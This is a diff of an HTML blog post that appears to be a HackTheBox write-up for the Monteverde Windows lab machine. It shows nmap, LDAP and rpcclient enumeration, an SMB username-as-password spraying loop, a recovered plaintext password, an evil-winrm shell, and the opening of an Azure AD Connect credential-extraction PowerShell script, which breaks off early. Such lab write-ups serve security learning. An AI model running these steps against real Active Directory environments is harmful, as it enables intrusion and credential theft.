@@ -6,30 +6,32 @@
   <meta http-equiv="X-UA-Compatible" content="ie=edge">
   <link rel="icon" type="image/png" href="/favicon.png">
   <link rel="stylesheet" type="text/css" href="/css/style.css">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Courier+Prime:wght@700&family=Inconsolata&family=Source+Code+Pro&display=swap" rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.gstatic.com"> 
+  <link
+  href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@500&family=Kanit:wght@600&family=Roboto&family=Electrolize&display=swap&family=Fira+Mono&family=Cousine&display=swapdisplay=swap&family=IBM+Plex+Mono&display=swap&family=Courier+Prime:wght@700&display=swap"
+  rel="stylesheet"> 
+  <link rel="preconnect" href="https://fonts.gstatic.com">
   <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
-  <!--<script src="/dist/mark.min.js" charset="UTF-8"></script>-->
-<title>Hackthebox - Montevarde Writeup &mdash; fmash16's blog</title>
+  <script src="/dist/mark.min.js" charset="UTF-8"></script>
+<title>Hackthebox - Montevarde
+Writeup &mdash; fmash16's blog</title>
 <meta property="og:title" content="Hackthebox - Montevarde Writeup" />
       <meta property="og:description" content="A medium difficulty windows box exploited through ldap and azure." />
       <meta property="og:type" content="article" />
       <meta property="og:url" content="github" />
-      <meta property="og:image" content="https://fmash16.github.io/img/htb_montevarde/card.png" />
+      <meta property="og:image" content="https://fmash16.github.io//img/htb_montevarde/card.png" />
 
 </head>
 
-<body>
-<!-- <h1 class=blogtitle>./fmash16's blog </h1> -->
-<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">
- ___               _   ___   ___ 
-|  _|_____ ___ ___| |_|_  | |  _|
-|  _|     | .'|_ -|   |_| |_| . |
-|_| |_|_|_|__,|___|_|_|_____|___|
-                 u/fmash16's blog</pre>
+<div class=blogtitle><a href="/index.html">fmash16's blog</a></div> 
+<!--<pre style="font-family:'Courier Prime';color:var(--accent-color);text-align:center;font-weight:1000">-->
+ <!--___               _   ___   ___ -->
+<!--|  _|_____ ___ ___| |_|_  | |  _|-->
+<!--|  _|     | .'|_ -|   |_| |_| . |-->
+<!--|_| |_|_|_|__,|___|_|_|_____|___|-->
+                 <!--./fmash16's blog</pre>-->
 <nav>
-   <a href="/index.html">home</a>
+   <!--<a href="/index.html">home</a>-->
    <a href="/archive.html">archive</a>
    <a href="mailto:fmash16@gmail.com">mail</a>
    <a href="https://github.com/fmash16">github</a>
@@ -39,56 +41,65 @@
 </nav>
 
 <article>
-<input id="toggle" type="checkbox" checked>
-<label for="toggle">TOC</label>
-<nav class='toc'>
-    <ul>
-    <li><a href="#hackthebox---montevarde-writeup">Hackthebox - Montevarde Writeup</a>
-    <ul>
-    <li><a href="#nmap-scan">## Nmap Scan</a></li>
-    <li><a href="#enum4linux">enum4linux:</a></li>
-    <li><a href="#ldapsearch">ldapsearch</a></li>
-    <li><a href="#rpcclient">rpcclient</a></li>
-    </ul></li>
-    <li><a href="#privilege-escalation---user">Privilege Escalation - User</a>
-    <ul>
-    <li><a href="#smbclient-bruteforce">smbclient bruteforce</a></li>
-    <li><a href="#azure.xml">azure.xml</a></li>
-    <li><a href="#evil-winrm-shell">Evil-winrm shell</a></li>
-    </ul></li>
-    <li><a href="#privilege-escalation---administrator">Privilege Escalation - Administrator</a>
-    <ul>
-    <li><a href="#azure-ad-connect-exploit">Azure AD Connect Exploit</a></li>
-    <li><a href="#administrator-shell">Administrator shell</a></li>
-    </ul></li>
-    <li><a href="#resources">Resources:</a></li>
-    </ul>
-</nav>
-<h1 id="hackthebox---montevarde-writeup">Hackthebox - Montevarde Writeup</h1>
+<ul>
+<li><a href="#hackthebox---montevarde-writeup">Hackthebox - Montevarde
+Writeup</a>
+<ul>
+<li><a href="#nmap-scan">## Nmap Scan</a></li>
+<li><a href="#enum4linux">enum4linux:</a></li>
+<li><a href="#ldapsearch">ldapsearch</a></li>
+<li><a href="#rpcclient">rpcclient</a></li>
+</ul></li>
+<li><a href="#privilege-escalation---user">Privilege Escalation -
+User</a>
+<ul>
+<li><a href="#smbclient-bruteforce">smbclient bruteforce</a></li>
+<li><a href="#azure.xml">azure.xml</a></li>
+<li><a href="#evil-winrm-shell">Evil-winrm shell</a></li>
+</ul></li>
+<li><a href="#privilege-escalation---administrator">Privilege Escalation
+- Administrator</a>
+<ul>
+<li><a href="#azure-ad-connect-exploit">Azure AD Connect
+Exploit</a></li>
+<li><a href="#administrator-shell">Administrator shell</a></li>
+</ul></li>
+<li><a href="#resources">Resources:</a></li>
+</ul>
+<h1 id="hackthebox---montevarde-writeup">Hackthebox - Montevarde
+Writeup</h1>
 <p><img src="/img/htb_montevarde/card.png" /></p>
 <h2 id="nmap-scan">## Nmap Scan</h2>
-<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sC</span> <span class="at">-sV</span> <span class="at">-sS</span> <span class="at">-oN</span> nmap.out 10.10.10.172</span></code></pre></div>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sC</span> <span class="at">-sV</span> <span class="at">-sS</span> <span class="at">-oN</span> nmap.out 10.10.10.172</span></code></pre></div>
 <p>Open ports: &gt; PORT STATE SERVICE VERSION<br />
 &gt; 53/tcp open domain?<br />
-&gt; 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time:<br />
+&gt; 88/tcp open kerberos-sec Microsoft Windows Kerberos (server
+time:<br />
 &gt; 2020-05-24 10:34:50Z)<br />
 &gt; 135/tcp open msrpc Microsoft Windows RPC<br />
 &gt; 139/tcp open netbios-ssn Microsoft Windows netbios-ssn<br />
-&gt; 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain:<br />
+&gt; 389/tcp open ldap Microsoft Windows Active Directory LDAP
+(Domain:<br />
 &gt; MEGABANK.LOCAL0., Site: Default-First-Site-Name)<br />
 &gt; 445/tcp open microsoft-ds?<br />
 &gt; 464/tcp open kpasswd5?<br />
 &gt; 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0<br />
 &gt; 636/tcp open tcpwrapped<br />
-&gt; 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain:<br />
+&gt; 3268/tcp open ldap Microsoft Windows Active Directory LDAP
+(Domain:<br />
 &gt; MEGABANK.LOCAL0., Site: Default-First-Site-Name)<br />
 &gt; 3269/tcp open tcpwrapped<br />
-&gt; 1 service unrecognized despite returning data. If you know the service/version,<br />
+&gt; 1 service unrecognized despite returning data. If you know the
+service/version,<br />
 &gt; please submit the following fingerprint at<br />
 &gt; https://nmap.org/cgi-bin/submit.cgi?new-service :<br />
-&gt; SF-Port53-TCP:V=7.80%I=7%D=5/24%Time=5ECA58C3%P=x86_64-pc-linux-gnu%r(DNSV<br />
-&gt; SF:ersionBindReqTCP,20,“\01e\0\0\0\0\0\0\0\007version  &gt; SF:x04bind\0\0\0”);<br />
-&gt; Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows<br />
+&gt;
+SF-Port53-TCP:V=7.80%I=7%D=5/24%Time=5ECA58C3%P=x86_64-pc-linux-gnu%r(DNSV<br />
+&gt; SF:ersionBindReqTCP,20,“\01e\0\0\0\0\0\0\0\007version  &gt;
+SF:x04bind\0\0\0”);<br />
+&gt; Service Info: Host: MONTEVERDE; OS: Windows; CPE:
+cpe:/o:microsoft:windows<br />
 &gt;<br />
 &gt; Host script results:<br />
 &gt; |<em>clock-skew: -46m45s<br />
@@ -104,7 +115,8 @@
 Machine Name : MONTEVARDE</p>
 </blockquote>
 <p>Got some users and groups:</p>
-<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Trading&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 2610<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\d</span>galanos</span>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Trading&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 2610<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\d</span>galanos</span>
 <span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\A</span>dministrator</span>
 <span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\k</span>rbtgt</span>
 <span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Domain Users&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 513<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\A</span>AD_987d7f2f57d2</span>
@@ -122,9 +134,11 @@ Machine Name : MONTEVARDE</p>
 <span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Azure Admins&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 2601<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\A</span>dministrator</span>
 <span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Azure Admins&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 2601<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\A</span>AD_987d7f2f57d2</span>
 <span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a><span class="ex">Group</span> <span class="st">&#39;Azure Admins&#39;</span> <span class="er">(</span><span class="ex">RID:</span> 2601<span class="kw">)</span> <span class="ex">has</span> member: MEGABANK<span class="dt">\m</span>hope</span></code></pre></div>
-<p>What is interesting is the group azure admins and its member mhope</p>
+<p>What is interesting is the group azure admins and its member
+mhope</p>
 <h2 id="ldapsearch">ldapsearch</h2>
-<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ldapsearch</span> <span class="at">-x</span> <span class="at">-h</span> 10.10.10.172 <span class="at">-s</span> base namingcontext</span>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ldapsearch</span> <span class="at">-x</span> <span class="at">-h</span> 10.10.10.172 <span class="at">-s</span> base namingcontext</span>
 <span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">ldapsearch</span> <span class="at">-x</span> <span class="at">-h</span> 10.10.10.172 <span class="at">-s</span> base</span></code></pre></div>
 <p><img src="/img/htb_montevarde/1.png" /></p>
 <p>We find:</p>
@@ -132,60 +146,94 @@ Machine Name : MONTEVARDE</p>
 <p>namingContexts: DC=MEGABANK,DC=LOCAL</p>
 </blockquote>
 <p>Now we can enumerate using ldapsearch</p>
-<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ldapsearch</span> <span class="at">-x</span> <span class="at">-b</span> <span class="st">&quot;dc=megabank,dc=local&quot;</span> <span class="at">-h</span> 10.10.10.172 <span class="at">-s</span> sub</span></code></pre></div>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ldapsearch</span> <span class="at">-x</span> <span class="at">-b</span> <span class="st">&quot;dc=megabank,dc=local&quot;</span> <span class="at">-h</span> 10.10.10.172 <span class="at">-s</span> sub</span></code></pre></div>
 <h2 id="rpcclient">rpcclient</h2>
-<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rpcclient</span> <span class="at">-U</span> <span class="st">&#39;&#39;</span> 10.10.10.172</span></code></pre></div>
-<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rpcclient</span> $<span class="op">&gt;</span> enumdomusers</span></code></pre></div>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rpcclient</span> <span class="at">-U</span> <span class="st">&#39;&#39;</span> 10.10.10.172</span></code></pre></div>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rpcclient</span> $<span class="op">&gt;</span> enumdomusers</span></code></pre></div>
 <p><img src="/img/htb_montevarde/2.png" /></p>
-<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rpcclient</span> $<span class="op">&gt;</span> enumdomgroups</span></code></pre></div>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rpcclient</span> $<span class="op">&gt;</span> enumdomgroups</span></code></pre></div>
 <p><img src="/img/htb_montevarde/3.png" /></p>
-<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rpclient</span> $<span class="op">&gt;</span> querygroupmem 0xa29</span></code></pre></div>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rpclient</span> $<span class="op">&gt;</span> querygroupmem 0xa29</span></code></pre></div>
 <p><img src="/img/htb_montevarde/4.png" /></p>
-<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rpcclient</span> $<span class="op">&gt;</span> queryuser 0x641</span></code></pre></div>
+<div class="sourceCode" id="cb9"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">rpcclient</span> $<span class="op">&gt;</span> queryuser 0x641</span></code></pre></div>
 <p><img src="/img/htb_montevarde/5.png" /></p>
 <h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
 <h2 id="smbclient-bruteforce">smbclient bruteforce</h2>
-<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="bu">read</span> <span class="va">USER</span><span class="kw">;</span> <span class="cf">do</span> <span class="bu">echo</span> <span class="va">$USER</span> <span class="kw">&amp;&amp;</span> <span class="ex">smbclient</span> <span class="at">-L</span> <span class="dt">\\\\</span>10.10.10.172 <span class="at">-U</span> <span class="va">$USER</span>%<span class="va">$USER</span><span class="kw">;</span> <span class="cf">done</span> <span class="op">&lt;</span> users.txt</span></code></pre></div>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="bu">read</span> <span class="va">USER</span><span class="kw">;</span> <span class="cf">do</span> <span class="bu">echo</span> <span class="va">$USER</span> <span class="kw">&amp;&amp;</span> <span class="ex">smbclient</span> <span class="at">-L</span> <span class="dt">\\\\</span>10.10.10.172 <span class="at">-U</span> <span class="va">$USER</span>%<span class="va">$USER</span><span class="kw">;</span> <span class="cf">done</span> <span class="op">&lt;</span> users.txt</span></code></pre></div>
 <p><img src="/img/htb_montevarde/6.png" /></p>
-<p>We see an intersting share users$. We mount the share using smbclient and have a look.</p>
-<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smbclient</span> <span class="dt">\\\\</span>10.10.10.172<span class="dt">\\</span>users$ <span class="at">-U</span> SABatchJobs%SABatchJobs</span></code></pre></div>
+<p>We see an intersting share users$. We mount the share using smbclient
+and have a look.</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">smbclient</span> <span class="dt">\\\\</span>10.10.10.172<span class="dt">\\</span>users$ <span class="at">-U</span> SABatchJobs%SABatchJobs</span></code></pre></div>
 <p><img src="/img/htb_montevarde/7.png" /></p>
-<p>In the direcotory of user mhope, we find an interesting file <strong>azure.xml</strong>, we download it to our local machine usign <strong>get</strong></p>
+<p>In the direcotory of user mhope, we find an interesting file
+<strong>azure.xml</strong>, we download it to our local machine usign
+<strong>get</strong></p>
 <p><img src="/img/htb_montevarde/8.png" /></p>
 <h2 id="azure.xml">azure.xml</h2>
 <p>Having a look at the file, we get</p>
-<div class="sourceCode" id="cb12"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;Objs</span><span class="ot"> Version=</span><span class="st">&quot;1.1.0.1&quot;</span><span class="ot"> xmlns=</span><span class="st">&quot;http://schemas.microsoft.com/powershell/2004/04&quot;</span><span class="kw">&gt;</span></span>
-<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">&lt;Obj</span><span class="ot"> RefId=</span><span class="st">&quot;0&quot;</span><span class="kw">&gt;</span></span>
-<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;TN</span><span class="ot"> RefId=</span><span class="st">&quot;0&quot;</span><span class="kw">&gt;</span></span>
-<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>      <span class="kw">&lt;T&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span class="kw">&lt;/T&gt;</span></span>
-<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>      <span class="kw">&lt;T&gt;</span>System.Object<span class="kw">&lt;/T&gt;</span></span>
-<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;/TN&gt;</span></span>
-<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;ToString&gt;</span>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential<span class="kw">&lt;/ToString&gt;</span></span>
-<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;Props&gt;</span></span>
-<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>      <span class="kw">&lt;DT</span><span class="ot"> N=</span><span class="st">&quot;StartDate&quot;</span><span class="kw">&gt;</span>2020-01-03T05:35:00.7562298-08:00<span class="kw">&lt;/DT&gt;</span></span>
-<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a>      <span class="kw">&lt;DT</span><span class="ot"> N=</span><span class="st">&quot;EndDate&quot;</span><span class="kw">&gt;</span>2054-01-03T05:35:00.7562298-08:00<span class="kw">&lt;/DT&gt;</span></span>
-<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a>      <span class="kw">&lt;G</span><span class="ot"> N=</span><span class="st">&quot;KeyId&quot;</span><span class="kw">&gt;</span>00000000-0000-0000-0000-000000000000<span class="kw">&lt;/G&gt;</span></span>
-<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a>      <span class="kw">&lt;S</span><span class="ot"> N=</span><span class="st">&quot;Password&quot;</span><span class="kw">&gt;</span>4n0therD4y@n0th3r$<span class="kw">&lt;/S&gt;</span></span>
-<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a>    <span class="kw">&lt;/Props&gt;</span></span>
-<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a>  <span class="kw">&lt;/Obj&gt;</span></span>
-<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;/Objs&gt;</span></span></code></pre></div>
-<p>Here we get a password. Since the file was in the directory of user mhope, it should be the password for mhope</p>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode xml"><code class="sourceCode xml"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">Objs</span><span class="ot"> Version=</span><span class="st">&quot;1.1.0.1&quot;</span><span class="ot"> xmlns=</span><span class="st">&quot;http://schemas.microsoft.com/powershell/2004/04&quot;</span>&gt;</span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>  &lt;<span class="kw">Obj</span><span class="ot"> RefId=</span><span class="st">&quot;0&quot;</span>&gt;</span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">TN</span><span class="ot"> RefId=</span><span class="st">&quot;0&quot;</span>&gt;</span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>      &lt;<span class="kw">T</span>&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/<span class="kw">T</span>&gt;</span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>      &lt;<span class="kw">T</span>&gt;System.Object&lt;/<span class="kw">T</span>&gt;</span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">TN</span>&gt;</span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">ToString</span>&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/<span class="kw">ToString</span>&gt;</span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">Props</span>&gt;</span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>      &lt;<span class="kw">DT</span><span class="ot"> N=</span><span class="st">&quot;StartDate&quot;</span>&gt;2020-01-03T05:35:00.7562298-08:00&lt;/<span class="kw">DT</span>&gt;</span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a>      &lt;<span class="kw">DT</span><span class="ot"> N=</span><span class="st">&quot;EndDate&quot;</span>&gt;2054-01-03T05:35:00.7562298-08:00&lt;/<span class="kw">DT</span>&gt;</span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a>      &lt;<span class="kw">G</span><span class="ot"> N=</span><span class="st">&quot;KeyId&quot;</span>&gt;00000000-0000-0000-0000-000000000000&lt;/<span class="kw">G</span>&gt;</span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a>      &lt;<span class="kw">S</span><span class="ot"> N=</span><span class="st">&quot;Password&quot;</span>&gt;4n0therD4y@n0th3r$&lt;/<span class="kw">S</span>&gt;</span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">Props</span>&gt;</span>
+<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a>  &lt;/<span class="kw">Obj</span>&gt;</span>
+<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">Objs</span>&gt;</span></code></pre></div>
+<p>Here we get a password. Since the file was in the directory of user
+mhope, it should be the password for mhope</p>
 <p>Creds found:</p>
 <blockquote>
 <p>User: mhope<br />
 Password: 4n0therD4y@n0th3r$</p>
 </blockquote>
 <h2 id="evil-winrm-shell">Evil-winrm shell</h2>
-<div class="sourceCode" id="cb13"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">evil-winrm</span> <span class="at">-i</span> 10.10.10.172 <span class="at">-u</span> mhope <span class="at">-p</span> 4n0therD4y@n0th3r$</span></code></pre></div>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="ex">evil-winrm</span> <span class="at">-i</span> 10.10.10.172 <span class="at">-u</span> mhope <span class="at">-p</span> 4n0therD4y@n0th3r$</span></code></pre></div>
 <p>And we get a shell. We also get our required user.txt file.</p>
 <p><img src="/img/htb_montevarde/9.png" /></p>
-<h1 id="privilege-escalation---administrator">Privilege Escalation - Administrator</h1>
+<h1 id="privilege-escalation---administrator">Privilege Escalation -
+Administrator</h1>
 <h2 id="azure-ad-connect-exploit">Azure AD Connect Exploit</h2>
-<p>Previously, we found that our user mhope is a member of the group “Azure Admins”. Microsoft Azure is a cloud computing service created by Microsoft for building, testing, deploying, and managing applications and services through Microsoft-managed data centers.</p>
-<p>We search for some azure vulnerabilites. We find an azure AD connect exploit <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">here.</a>. The same vulnerability is also found <a href="https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/">here.</a>.</p>
-<p>Azure AD has a feature called “Password Hash Synchronization”. With Password Hash Synchronization (PHS), the passwords from on-premise AD are actually sent to the cloud, similar to how domain controllers synchronize passwords between each other via replication. This is done from a service account that is created with the installation of AD Connect. So, using this feature, we can perform a <strong>DCsunc</strong> attack. Read more on this type of attacks <a href="https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync">here.</a></p>
-<p>So here, the vulnerability allows us to access the DC database containing creds and decrypt it (performing a <strong>DCsync</strong>). We get the powershell script (here.)[https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1] We change the script according to our needs as follows</p>
-<div class="sourceCode" id="cb14"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a>    <span class="fu">Write-Host</span> <span class="st">&quot;AD Connect Sync Credential Extract POC (@_xpn_)</span><span class="ch">`n</span><span class="st">&quot;</span></span>
+<p>Previously, we found that our user mhope is a member of the group
+“Azure Admins”. Microsoft Azure is a cloud computing service created by
+Microsoft for building, testing, deploying, and managing applications
+and services through Microsoft-managed data centers.</p>
+<p>We search for some azure vulnerabilites. We find an azure AD connect
+exploit <a
+href="https://blog.xpnsec.com/azuread-connect-for-redteam/">here.</a>.
+The same vulnerability is also found <a
+href="https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/">here.</a>.</p>
+<p>Azure AD has a feature called “Password Hash Synchronization”. With
+Password Hash Synchronization (PHS), the passwords from on-premise AD
+are actually sent to the cloud, similar to how domain controllers
+synchronize passwords between each other via replication. This is done
+from a service account that is created with the installation of AD
+Connect. So, using this feature, we can perform a
+<strong>DCsunc</strong> attack. Read more on this type of attacks <a
+href="https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync">here.</a></p>
+<p>So here, the vulnerability allows us to access the DC database
+containing creds and decrypt it (performing a <strong>DCsync</strong>).
+We get the powershell script
+(here.)[https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1]
+We change the script according to our needs as follows</p>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a>    <span class="fu">Write-Host</span> <span class="st">&quot;AD Connect Sync Credential Extract POC (@_xpn_)</span><span class="ch">`n</span><span class="st">&quot;</span></span>
 <span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="op">[-]</span> <span class="va">$client</span> <span class="op">=</span> <span class="fu">new-object</span> System<span class="op">.</span><span class="fu">Data</span><span class="op">.</span><span class="fu">SqlClient</span><span class="op">.</span><span class="fu">SqlConnection</span> <span class="op">-</span>ArgumentList <span class="st">&quot;Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync&quot;</span></span>
